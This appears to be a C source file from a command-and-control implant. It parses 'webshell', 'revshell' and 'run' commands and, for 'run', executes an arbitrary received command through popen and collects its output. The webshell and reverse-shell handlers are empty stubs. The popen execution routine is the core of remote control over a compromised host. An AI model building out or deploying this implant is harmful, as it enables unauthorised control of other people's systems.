#include "c2types.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum CommandType parse_command_type(char* s)
{
    if (strcmp(s, "webshell") == 0) {
        return WebShell;
    } else if (strcmp(s, "revshell") == 0) {
        return RevShell;
    } else if (strcmp(s, "run") == 0) {
        return Run;
    } else {
        fprintf(stderr, "Unexpected command type: %s\n", s);
        exit(EXIT_FAILURE);
    }
}

char* unparse_command_type(enum CommandType type)
{
    switch (type) {
    case WebShell:
        return "webshell";
        break;
    case RevShell:
        return "revshell";
        break;
    case Run:
        return "run";
        break;
    }
}

void run_command_system(struct Command* command)
{
    char buffer[1024];
    FILE *pipe;

    pipe = popen(command->arg, "r");
    if (pipe == NULL) {
        fprintf(stderr, "popen failed: %s\n", command->arg);
        exit(EXIT_FAILURE);
    }

    // Read the output of the command
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

        if (!command->result) {
            command->result = malloc(strlen(buffer) + 1);
            if (command->result == NULL) {
                fprintf(stderr, "malloc failed");
                exit(EXIT_FAILURE);
            }
            strcpy(command->result, buffer);
            continue;
        }


        int len = strlen(command->result);
        command->result = realloc(command->result, len + strlen(buffer) + 1);
        if (command->result == NULL) {
            fprintf(stderr, "realloc failed");
            exit(EXIT_FAILURE);
        }
        strcpy(command->result + len, buffer);
    }

    // Close the pipe
    if (pclose(pipe) == -1) {
        fprintf(stderr, "pclose failed\n");
        exit(EXIT_FAILURE);
    }
}

void run_command(struct Command* command)
{
    switch (command->type) {
    case WebShell:
        break;
    case RevShell:
        break;
    case Run:
        run_command_system(command);
        break;
    }
}
